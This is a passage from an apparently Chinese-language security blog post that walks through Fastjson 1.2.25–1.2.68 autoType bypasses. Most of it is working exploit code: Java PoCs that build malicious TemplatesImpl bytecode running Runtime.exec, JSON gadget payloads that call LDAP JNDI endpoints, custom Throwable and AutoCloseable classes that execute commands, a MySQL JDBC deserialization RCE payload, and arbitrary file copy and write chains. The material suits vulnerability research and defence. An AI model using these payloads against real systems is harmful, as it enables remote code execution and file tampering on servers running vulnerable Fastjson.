\&quot;AutoCommit\&quot;:true\n&quot; +                &quot;    &#125;\n&quot; +                &quot;&#125;&quot;;        JSON.parseObject(payload);    &#125;&#125;</code></pre><p>TemplatesImpl利用链：(建议使用这个利用链，不受JDK版本限制)</p><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;import java.io.*;import com.alibaba.fastjson.parser.Feature;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.*;import com.alibaba.fastjson.parser.JSONScanner;import java.nio.charset.StandardCharsets;import java.util.Base64;public class App&#123;    public static void main( String[] args ) throws NotFoundException, CannotCompileException, IOException &#123;        //构造恶意类        ClassPool pool = ClassPool.getDefault();        CtClass Evil = pool.makeClass(&quot;Evil&quot;);        Evil.setSuperclass(pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;));        String name = &quot;Evil&quot;;        Evil.setName(name);        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;        CtConstructor constructor = Evil.makeClassInitializer();        constructor.insertBefore(cmd);        byte[] bytes =Evil.toBytecode();        byte[] encodedBytes = Base64.getEncoder().encode(bytes);        String base64Code=new String(encodedBytes, StandardCharsets.UTF_8);        String payload =&quot;&#123;\n&quot; +                &quot;    \&quot;a\&quot;:&#123;\n&quot; +                &quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot; +                &quot;        \&quot;val\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;&#125;,\n&quot; +                &quot;    \&quot;b\&quot;:&#123;\n&quot; +                &quot;        \&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot; +                &quot;        \&quot;_bytecodes\&quot;:[\&quot;&quot;+base64Code+&quot;\&quot;],\n&quot; +                &quot;        \&quot;_name\&quot;:\&quot;aa\&quot;,\n&quot; +                &quot;        \&quot;_tfactory\&quot;:&#123; &#125;,\n&quot; +                &quot;        \&quot;_outputProperties\&quot;:&#123;&#125;,\n&quot; +                &quot;        \&quot;_version\&quot;:\&quot;\&quot;\n&quot; +                &quot;    &#125;\n&quot; +                &quot;&#125;&quot;;        JSON.parse(payload, Feature.SupportNonPublicField);    &#125;&#125;</code></pre><p><strong>注意：</strong></p><ul><li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</li><li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</li></ul><h2 id="Fastjson1-2-25-1-2-59"><a href="#Fastjson1-2-25-1-2-59" class="headerlink" title="Fastjson1.2.25-1.2.59"></a>Fastjson1.2.25-1.2.59</h2><p>需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制</p><p>com.zaxxer.hikari.HikariConfig类PoC：</p><pre><code class="json">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;或&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</code></pre><h2 id="Fastjson1-2-25-1-2-61"><a href="#Fastjson1-2-25-1-2-61" class="headerlink" title="Fastjson1.2.25-1.2.61"></a>Fastjson1.2.25-1.2.61</h2><p>需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制</p><p>org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：</p><pre><code class="json">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;Object&quot;:&quot;a&quot;&#125;</code></pre><h2 id="Fastjson1-2-25-1-2-62"><a href="#Fastjson1-2-25-1-2-62" class="headerlink" title="Fastjson1.2.25-1.2.62"></a>Fastjson1.2.25-1.2.62</h2><p>条件：xbean-reflect，开启AutoType</p><p>环境搭建：</p><pre><code class="xml">&lt;dependency&gt;  &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  &lt;version&gt;1.2.62&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;      &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;      &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;      &lt;version&gt;4.15&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>1.2.48中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将java.lang.Class类加入到了黑名单中。</p><p>这个版本是找到一个新的利用类进行黑名单绕过</p><p>使用的是org.apache.xbean.propertyeditor.JndiConverter这个类</p><p>漏洞在</p><pre><code class="java">public class JndiConverter extends AbstractConverter &#123;    public JndiConverter() &#123;        super(Context.class);    &#125;    protected Object toObjectImpl(String text) &#123;        try &#123;            InitialContext context = new InitialContext();            return (Context) context.lookup(text);        &#125; catch (NamingException e) &#123;            throw new PropertyEditorException(e);        &#125;    &#125;&#125;</code></pre><p>这个类继承<code>AbstractConverter</code>，而且可以看到这个<code>toObjectImpl</code>方法，如果参数text可控，则可以进行JNDI注入</p><p>查找哪里调用了<code>toObjectImpl</code>方法</p><pre><code class="java">public final Object toObject(String text) &#123;    if (text == null) &#123;        return null;    &#125;    Object value = toObjectImpl((trim) ? text.trim() : text);    return value;&#125;</code></pre><p>再寻找调用<code>toObject</code>的地方</p><pre><code class="java">public final void setAsText(String text) &#123;    Object value = toObject((trim) ? text.trim() : text);    super.setValue(value);&#125;</code></pre><p>这个setter方法满足fastjson反序列化自动调用</p><p>因为AbstractConverter是abstract修饰的类</p><pre><code class="java">public abstract class AbstractConverter extends PropertyEditorSupport implements Converter&#123;&#125;</code></pre><p>所以这里@type使用的是继承AbstractConverter的类<code>org.apache.xbean.propertyeditor.JndiConverter</code></p><p>最终POC</p><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;import org.apache.xbean.propertyeditor.JndiConverter;public class App&#123;    public static void main( String[] args ) &#123;        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);        String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;&#125;&quot;;        JSON.parseObject(payload);    &#125;&#125;</code></pre><p>还可以使用另外的类：</p><p>org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：</p><pre><code class="json">&#123;&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123;&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;, &quot;namespace&quot;:&quot;&quot;&#125;</code></pre><h2 id="Fastjson1-2-25-1-2-66"><a href="#Fastjson1-2-25-1-2-66" class="headerlink" title="Fastjson1.2.25-1.2.66"></a>Fastjson1.2.25-1.2.66</h2><p>条件：开启AutoType</p><p>这里也是寻找到新的利用类，这个版本有很多,原理都一样就不一个个分析了</p><p>org.apache.shiro.realm.jndi.JndiRealmFactory类PoC：</p><pre><code class="json">&#123;&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;], &quot;Realms&quot;:[&quot;&quot;]&#125;</code></pre><p>br.com.anteros.dbcp.AnterosDBCPConfig类PoC：</p><pre><code class="json">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;&#125;或&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;&#125;</code></pre><p>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类PoC：</p><pre><code class="json">&#123;    &quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,    &quot;properties&quot;: &#123;        &quot;@type&quot;:&quot;java.util.Properties&quot;,        &quot;UserTransaction&quot;:&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;    &#125;&#125;</code></pre><p>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</p><p>br.com.anteros.dbcp.AnterosDBCPConfig类需要Anteros-Core和Anteros-DBCP包；</p><p>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</p><h2 id="Fastjson1-2-25-1-2-67"><a href="#Fastjson1-2-25-1-2-67" class="headerlink" title="Fastjson1.2.25-1.2.67"></a>Fastjson1.2.25-1.2.67</h2><p>条件：开启AutoType</p><p>也是找到新的利用类</p><p>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC：</p><pre><code class="json">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap://localhost:1389/Exploit&quot;], &quot;tm&quot;: &#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;&#125;</code></pre><p>org.apache.shiro.jndi.JndiObjectFactory类PoC：</p><pre><code class="json">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;&#125;</code></pre><p>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</p><p>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；</p><h2 id="Fastjson1-2-25-1-2-68"><a href="#Fastjson1-2-25-1-2-68" class="headerlink" title="Fastjson1.2.25-1.2.68"></a>Fastjson1.2.25-1.2.68</h2><p>环境搭建：</p><pre><code class="xml">&lt;dependency&gt;  &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  &lt;version&gt;1.2.68&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>上面几个版本的修复都是通过将可利用的恶意类添加到黑名单</p><p>下面是全新的绕过方式</p><h3 id="Exception绕过（-gt-1-2-39）"><a href="#Exception绕过（-gt-1-2-39）" class="headerlink" title="Exception绕过（&gt;1.2.39）"></a>Exception绕过（&gt;1.2.39）</h3><p>这个绕过有点类似1.2.47版本的  这里使用的是<code>java.lang.Exception</code>的这个类，利用条件有点苛刻</p><pre><code class="json">&#123;&quot;@type&quot;:&quot;java.lang.Exception&quot;&#125;</code></pre><p>为什么要使用这个，首先，这个类不在黑白名单里面，其次这个类是反序列化的过程中程序已经存储在mappings缓存里面了，clazz可直接在这里获取到类名返回</p><p>即<code>checkAutoType()</code>里面的：</p><pre><code class="java">clazz = TypeUtils.getClassFromMapping(typeName);</code></pre><pre><code class="java">public static Class&lt;?&gt; getClassFromMapping(String className)&#123;    return mappings.get(className);&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230811155546108.png" alt="image-20230811155546108"></p><p>获取到这个clazz之后，返回到<code>DefaultJSONParser.parseObject</code></p><p>运行到结尾处</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230811160312151.png" alt="image-20230811160312151"></p><p>进入这个<code>deserialze</code></p><p>这里存在一个逻辑，根据一些条件来设置<code>exClass</code>变量的值</p><pre><code class="java">if (type != null &amp;&amp; type instanceof Class) &#123;    Class&lt;?&gt; clazz = (Class&lt;?&gt;) type;    if (Throwable.class.isAssignableFrom(clazz)) &#123;       exClass = clazz;    &#125;&#125;</code></pre><p>首先判断这个type是不是Class的实例，再判断是不是<code>Throwable</code>或其子类，如果满足这些条件就给<code>exClass = clazz</code>,  java.lang.Exception就满足了这些情况</p><p>往下</p><p>下面的逻辑是解析json中的下一个key和value ，有点类似DefaultJSONParser.parseObject中第一次运行到checkAutoType的逻辑</p><pre><code class="java">String key = lexer.scanSymbol(parser.getSymbolTable());lexer.nextTokenWithColon(JSONToken.LITERAL_STRING);if (JSON.DEFAULT_TYPE_KEY.equals(key)) &#123;    if (lexer.token() == JSONToken.LITERAL_STRING) &#123;        String exClassName = lexer.stringVal();        exClass = parser.getConfig().checkAutoType(exClassName, Throwable.class, lexer.getFeatures());    &#125; else &#123;        throw new JSONException(&quot;syntax error&quot;);    &#125;    lexer.nextToken(JSONToken.COMMA);&#125; </code></pre><p>首先获取key，判断这个key是不是@type 如果是，则再获取处Value,也就是@type指定的类的名字，然后再进入<code>checkAutoType</code>进行检查</p><p>注意的是，这次checkAutoType的第二个参数是<code>Throwable.class</code>,而第一次为NULL</p><p>跟进checkAutoType</p><p>来到这个地方</p><pre><code class="java">final boolean expectClassFlag;if (expectClass == null) &#123;    expectClassFlag = false;&#125; else &#123;    if (expectClass == Object.class            || expectClass == Serializable.class            || expectClass == Cloneable.class            || expectClass == Closeable.class            || expectClass == EventListener.class            || expectClass == Iterable.class            || expectClass == Collection.class            ) &#123;        expectClassFlag = false;    &#125; else &#123;        expectClassFlag = true;    &#125;&#125;</code></pre><p>这里定义了一个布尔类型的expectClassFlag，再判断expectClass是否为空，expectClass就是checkAutoType的第二个参数  <code>class java.lang.Throwable</code>,不为空，然后在判断expectClass是不上那几个类，如果是则expectClassFlag &#x3D; false ，显然，Throwable.class并不在其中 ，所以expectClassFlag &#x3D; true</p><p>expectClassFlag &#x3D; true有什么用呢？</p><p>继续往下，经过了黑白名单检查后，来到了这个逻辑</p><pre><code class="java">if (autoTypeSupport || jsonType || expectClassFlag) &#123;    boolean cacheClass = autoTypeSupport || jsonType;    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);&#125;</code></pre><p>这里expectClassFlag&#x3D;true,会进入这个if语句，然后就加载得到clazz</p><p>加载后在哪返回?</p><pre><code class="java">if (expectClass != null) &#123;                if (expectClass.isAssignableFrom(clazz)) &#123;                    TypeUtils.addMapping(typeName, clazz);                    return clazz;                &#125; else &#123;                    throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());                &#125;            &#125;</code></pre><p>因为expectClass !&#x3D; null进入这个判断里，再判断第二个@type指定的类，即clazz，是不是<code>java.lang.Throwable</code>的子类或者相同类</p><p>如果是则添加到Mapping里面并返回</p><p>也就是说，要利用这个绕过方法，autoType可开可不开,但利用的恶意类必须是<code>Throwable</code>的子类或者相同类 ，而且还不能是存在于黑名单的类</p><p>例如自己写的恶意类</p><pre><code class="java">import java.io.IOException;import java.lang.Exception;import java.lang.Throwable;public class Test extends Throwable&#123;//public class Test extends Exception&#123;  //也可以继承 Exception    private String domain;    public Test() &#123;        super();    &#125;    public void setDomain(String domain) &#123;        this.domain = domain;    &#125;    @Override    public String getMessage() &#123;        try &#123;            Runtime.getRuntime().exec(new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;,domain&#125;);        &#125; catch (IOException e) &#123;            return e.getMessage();        &#125;        return super.getMessage();    &#125;&#125;</code></pre><p>然后POC如下:</p><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;public class App&#123;    public static void main( String[] args ) &#123;        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);        String payload=&quot; &#123;\n&quot; +                &quot;            \&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\n&quot; +                &quot;                \&quot;@type\&quot;: \&quot;org.example.Test\&quot;,\n&quot; +                &quot;                \&quot;domain\&quot;: \&quot;calc\&quot;\n&quot; +                &quot;        &#125;&quot;;        JSON.parseObject(payload);    &#125;&#125;</code></pre><p>网上找了一圈，找到符合要求的利用类是<code>org.openqa.selenium.WebDriverException</code></p><pre><code class="java">public class WebDriverException extends RuntimeException</code></pre><p>这个RuntimeException是Exception的子类，满足条件</p><p>利用的是下面这个方法来获取到一些信息</p><pre><code class="java">public String getSystemInformation() &#123;    String host = &quot;N/A&quot;;    String ip = &quot;N/A&quot;;    try &#123;        host = InetAddress.getLocalHost().getHostName();        ip = InetAddress.getLocalHost().getHostAddress();    &#125; catch (UnknownHostException var4) &#123;    &#125;    return String.format(&quot;System info: host: &#39;%s&#39;, ip: &#39;%s&#39;, os.name: &#39;%s&#39;, os.arch: &#39;%s&#39;, os.version: &#39;%s&#39;, java.version: &#39;%s&#39;&quot;, host, ip, System.getProperty(&quot;os.name&quot;), System.getProperty(&quot;os.arch&quot;), System.getProperty(&quot;os.version&quot;), System.getProperty(&quot;java.version&quot;));&#125;</code></pre><p>但是这个方法的返回值是 <code>String</code>类型的，不符合自动调用getter </p><p>这里使用<code>$ref</code>的方式来调用任意的getter</p><pre><code class="java">String payload = &quot;&#123;\&quot;x\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\&quot;@type\&quot;:\&quot;org.openqa.selenium.WebDriverException\&quot;&#125;,\&quot;content\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$x.systemInformation\&quot;&#125;&#125;&quot;;JSONObject j = JSON.parseObject(payload);System.out.println(j.getString(&quot;content&quot;));</code></pre><h3 id="AutoCloseable绕过"><a href="#AutoCloseable绕过" class="headerlink" title="AutoCloseable绕过"></a>AutoCloseable绕过</h3><p>除了Exception之外，还可以用通过AutoCloseable的方式来进行绕过</p><pre><code class="java">clazz = TypeUtils.getClassFromMapping(typeName);</code></pre><p>这个<code>java.lang.AutoCloseable</code>接口存在于mapping的缓存中</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230814104302725.png" alt="image-20230814104302725"></p><p>后面的流程是和上面Exception的绕过方法流程是一样的</p><p>只要找到一个类实现了<code>AutoCloseable</code>接口的类，并且这个类不存在于黑名单中就可以利用了</p><p>例如</p><pre><code class="java">package org.example;import java.io.IOException;import java.lang.Exception;public class Test implements AutoCloseable&#123;    private String domain;    public Test() &#123;        super();    &#125;    public void setDomain(String domain) &#123;        this.domain = domain;    &#125;    public Class&lt;?&gt; getMessage() &#123;        try &#123;            Runtime.getRuntime().exec(new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;,domain&#125;);        &#125; catch (IOException e) &#123;            return e.getMessage().getClass();        &#125;        return super.getClass();    &#125;    @Override    public void close() throws Exception &#123;    &#125;&#125;</code></pre><p>poc:</p><pre><code class="java">String payload=&quot; &#123;\n&quot; +        &quot;            \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot; +        &quot;                \&quot;@type\&quot;: \&quot;org.example.Test\&quot;,\n&quot; +        &quot;                \&quot;domain\&quot;: \&quot;calc\&quot;\n&quot; +        &quot;        &#125;&quot;;JSON.parseObject(payload);</code></pre><h3 id="Mysql-RCE"><a href="#Mysql-RCE" class="headerlink" title="Mysql RCE"></a>Mysql RCE</h3><p>环境搭建</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;mysql&lt;/groupId&gt;    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;    &lt;version&gt;5.1.11&lt;/version&gt;&lt;/dependency&gt;//MYSQL RCE需要配合Gadget使用&lt;dependency&gt;    &lt;groupId&gt;commons-collections&lt;/groupId&gt;    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;    &lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>这个是依赖上面的AutoCloseable进行绕过，利用的类是<code>com.mysql.jdbc.JDBC4Connection</code></p><p>JDBC4Connection继承ConnectionImpl，ConnectionImpl实现Connection的接口，Connection继承java.sql.Connection，java.sql.Connection继承AutoCloseable, 而且这个类不在 黑名单里面看，所以这个类是可以使用的</p><p>POC如下：</p><p>需要使用<a href="https://github.com/4ra1n/mysql-fake-server%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%E8%B5%B7%E4%B8%80%E4%B8%AA%E8%99%9A%E5%81%87%E7%9A%84mysql%E6%9C%8D%E5%8A%A1">https://github.com/4ra1n/mysql-fake-server这个工具起一个虚假的mysql服务</a></p><pre><code class="json">&#123;     &quot;name&quot;: &#123;         &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,         &quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;,         &quot;hostToConnectTo&quot;: &quot;127.0.0.1&quot;,         &quot;portToConnectTo&quot;: 3308,         &quot;info&quot;: &#123;             &quot;user&quot;: &quot;deser_CC31_calc.exe&quot;,             &quot;password&quot;: &quot;pass&quot;,             &quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,             &quot;autoDeserialize&quot;: &quot;true&quot;,             &quot;NUM_HOSTS&quot;: &quot;1&quot;         &#125;     &#125;</code></pre><p>上面的POC只是适合mysql-connector 5.1.x版本的</p><p>不同的mysql-connector版本poc不同</p><p><img src="https://img.sumsec.me///52u3652ec52u3652ec.png" alt="image-20211220173824621"></p><h3 id="SafeFileOutputStream文件操作"><a href="#SafeFileOutputStream文件操作" class="headerlink" title="SafeFileOutputStream文件操作"></a>SafeFileOutputStream文件操作</h3><p>环境搭建</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;org.aspectj&lt;/groupId&gt;    &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;    &lt;version&gt;1.5.4&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>这里使用的是<code>org.eclipse.core.internal.localstore.SafeFileOutputStream</code></p><p>SafeFileOutputStream继承OutputStream，OutputStream实现Closeable接口，Closeable接口继承AutoCloseable,所以这个类可以用</p><p>主要利用的是这个构造函数</p><pre><code class="java">public SafeFileOutputStream(String targetPath, String tempPath) throws IOException &#123;        this.failed = false;        this.target = new File(targetPath);        this.createTempFile(tempPath);        if (!this.target.exists()) &#123;            if (!this.temp.exists()) &#123;                this.output = new BufferedOutputStream(new FileOutputStream(this.target));                return;            &#125;            this.copy(this.temp, this.target);        &#125;        this.output = new BufferedOutputStream(new FileOutputStream(this.temp));    &#125;</code></pre><p>首先调用了createTempFile，如果tempPath为空则会指定为默认的<code>this.target.getAbsolutePath() + &quot;.bak&quot;;</code><br>如果不为空则以tempPath为主。</p><pre><code class="java">protected void createTempFile(String tempPath) &#123;    if (tempPath == null) &#123;        tempPath = this.target.getAbsolutePath() + &quot;.bak&quot;;    &#125;    this.temp = new File(tempPath);&#125;</code></pre><p>接着判断target是否存在，以及temp是否存在。如果target不存在，temp存在，则会调用copy方法,copy方法会将temp的内容丢给target</p><pre><code class="java">protected void copy(File sourceFile, File destinationFile) throws IOException &#123;    if (sourceFile.exists()) &#123;        if (!sourceFile.renameTo(destinationFile)) &#123;            InputStream source = new BufferedInputStream(new FileInputStream(sourceFile));            OutputStream destination = new BufferedOutputStream(new FileOutputStream(destinationFile));            this.transferStreams(source, destination);        &#125;    &#125;&#125;</code></pre><p>这个其实就是一个文件迁移的操作</p><p>POC如下</p><pre><code class="json">&#123;     &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,     &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,     &quot;targetPath&quot;: &quot;./1.txt&quot;,     &quot;tempPath&quot;: &quot;./2.txt&quot;&#125;//将2.txt的内容迁移到1.txt中，2.txt中的内容被清空</code></pre><h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><p>环境搭建</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;    &lt;artifactId&gt;kryo&lt;/artifactId&gt;    &lt;version&gt;4.0.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;    &lt;artifactId&gt;je&lt;/artifactId&gt;    &lt;version&gt;18.3.12&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>接着上面的文件操作</p><p>这里利用的连个类<code>com.esotericsoftware.kryo.io.Output</code>和<code>com.sleepycat.bind.serial.SerialOutput</code>都是<code>AutoCloseable</code></p><p>的子类，可利用</p><p>在SafeFileOutputStream中，创建了一个以tempPath或者targetPath为目标的输出流</p><p>如果tempPath不存在，则BufferedOutputStream就是targetPath，如果tempPath存在targetPath不存在，则BufferedOutputStream就是tempPath。</p><pre><code class="java">public SafeFileOutputStream(String targetPath, String tempPath) throws IOException &#123;    this.failed = false;    this.target = new File(targetPath);    this.createTempFile(tempPath);    if (!this.target.exists()) &#123;        if (!this.temp.exists()) &#123;            this.output = new BufferedOutputStream(new FileOutputStream(this.target));            return;        &#125;        this.copy(this.temp, this.target);    &#125;    this.output = new BufferedOutputStream(new FileOutputStream(this.temp));&#125;</code></pre><p>如果能控制这个输出流就能进行文件写入了，如何控制这个输出流？</p><p>在<code>com.esotericsoftware.kryo.io.Output</code>这个类中找到一个set写入输出流</p><pre><code class="java">public void setOutputStream(OutputStream outputStream) &#123;    this.outputStream = outputStream;    this.position = 0;    this.total = 0L;&#125;</code></pre><p>可以通过fastjson的循环引用<code>$ref</code>,获取到<code>SafeFileOutputStream</code>的输出流</p><p>在flush中将内容写入</p><pre><code class="java">public void flush() throws KryoException &#123;    if (this.outputStream != null) &#123;        try &#123;            this.outputStream.write(this.buffer, 0, this.position);            this.outputStream.flush();        &#125; catch (IOException var2) &#123;            throw new KryoException(var2);        &#125;        this.total += (long)this.position;        this.position = 0;    &#125;&#125;</code></pre><p>可以看到这个flush代码中的<code>write</code>调用，将存储在缓冲区<code>buffer</code>中的内容，从位置0开始，长度this.position的内容，通过输出流输出</p><p>this.buffer可以控制</p><pre><code class="java">public void setBuffer(byte[] buffer) &#123;    this.setBuffer(buffer, buffer.length);&#125;public void setBuffer(byte[] buffer, int maxBufferSize) &#123;    if (buffer == null) &#123;        throw new IllegalArgumentException(&quot;buffer cannot be null.&quot;);    &#125; else if (buffer.length &gt; maxBufferSize &amp;&amp; maxBufferSize != -1) &#123;        throw new IllegalArgumentException(&quot;buffer has length: &quot; + buffer.length + &quot; cannot be greater than maxBufferSize: &quot; + maxBufferSize);    &#125; else if (maxBufferSize &lt; -1) &#123;        throw new IllegalArgumentException(&quot;maxBufferSize cannot be &lt; -1: &quot; + maxBufferSize);    &#125; else &#123;        this.buffer = buffer;        this.maxCapacity = maxBufferSize == -1 ? Integer.MAX_VALUE : maxBufferSize;        this.capacity = buffer.length;        this.position = 0;        this.total = 0L;        this.outputStream = null;    &#125;&#125;</code></pre><p>注意：写入的内容会转为byte类型数组，在fastjson中，这个byte数组会被base64解码，所以要将写入的内容进行base64加密</p><p>this.position也可以控制</p><pre><code class="java">public void setPosition(int position) &#123;    this.position = position;&#125;</code></pre><p>到此，就差如何调用flush()触发漏洞</p><p>flush 方法只有在 close 和 write 方法被调用时才会触发。</p><p>com.sleepycat.bind.serial.SerialOutput这个类继承着ObjectOutputStream</p><p>在ObjectOutputStream中存在一个构造方法：</p><pre><code class="java">public ObjectOutputStream(OutputStream out) throws IOException &#123;    verifySubclass();    bout = new BlockDataOutputStream(out);    handles = new HandleTable(10, (float) 3.00);    subs = new ReplaceTable(10, (float) 3.00);    enableOverride = false;    writeStreamHeader();    bout.setBlockDataMode(true);    if (extendedDebugInfo) &#123;        debugInfoStack = new DebugTraceInfoStack();    &#125; else &#123;        debugInfoStack = null;    &#125;&#125;</code></pre><p>跟进 setBlockDataMode()</p><pre><code class="java">boolean setBlockDataMode(boolean mode) throws IOException &#123;    if (blkmode == mode) &#123;        return blkmode;    &#125;    drain();    blkmode = mode;    return !blkmode;&#125;</code></pre><p>跟进drain()</p><pre><code class="java">void drain() throws IOException &#123;    if (pos == 0) &#123;        return;    &#125;    if (blkmode) &#123;        writeBlockHeader(pos);    &#125;    out.write(buf, 0, pos);    pos = 0;&#125;</code></pre><p>这里就调用了<code>write</code></p><p>将out设置为<code>com.esotericsoftware.kryo.io.Output</code>这个类即可</p><p>最终POC:</p><pre><code class="json">&#123;    &quot;stream&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,        &quot;targetPath&quot;: &quot;/1.txt&quot;,        &quot;tempPath&quot;: &quot;a&quot;    &#125;,    &quot;writer&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,        &quot;buffer&quot;: &quot;aGVsbDA=&quot;,        &quot;outputStream&quot;: &#123;            &quot;$ref&quot;: &quot;$.stream&quot;        &#125;,        &quot;position&quot;: 5  //字符长度    &#125;,    &quot;close&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,        &quot;out&quot;: &#123;            &quot;$ref&quot;: &quot;$.writer&quot;        &#125;    &#125;&#125;</code></pre><h3 id="Commons-IO-2-x-写文件"><a href="#Commons-IO-2-x-写文件" class="headerlink" title="Commons IO 2.x 写文件"></a>Commons IO 2.x 写文件</h3><p>参考<a href="https://zhuanlan.zhihu.com/p/376759650">https://zhuanlan.zhihu.com/p/376759650</a></p><p>暂时不想写</p><p>环境搭建</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;commons-io&lt;/groupId&gt;    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;    